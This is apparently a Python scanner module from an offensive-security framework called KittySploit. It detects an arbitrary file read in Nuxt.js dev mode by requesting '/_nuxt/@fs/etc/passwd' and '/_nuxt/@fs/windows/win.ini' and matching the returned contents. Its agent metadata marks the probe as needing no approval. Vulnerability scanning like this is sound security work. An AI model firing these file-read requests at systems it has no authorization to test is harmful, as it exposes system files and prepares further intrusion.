#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vite is misconfigured within nuxt to permit any file to be retrieved from the file system."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Arbitrary File Read in Dev Mode - Nuxt.js Detection',
        'description': 'Vite is misconfigured within nuxt to permit any file to be retrieved from the file system.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'huntr', 'lfi', 'nuxtjs', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/4849af83-450c-435e-bc0b-71705f5be440/',
            'https://bryces.io/blog/nuxt3',
            'https://twitter.com/fofabot/status/1669339995780558849',
        ],
    }

    def run(self):
        for path in ('/_nuxt/@fs/etc/passwd', '/_nuxt/@fs/windows/win.ini'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:', '\\[(font|extension|file)s\\]',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Arbitrary File Read in Dev Mode - Nuxt.js detected",
                    path=path,
                )
                return True
        return False

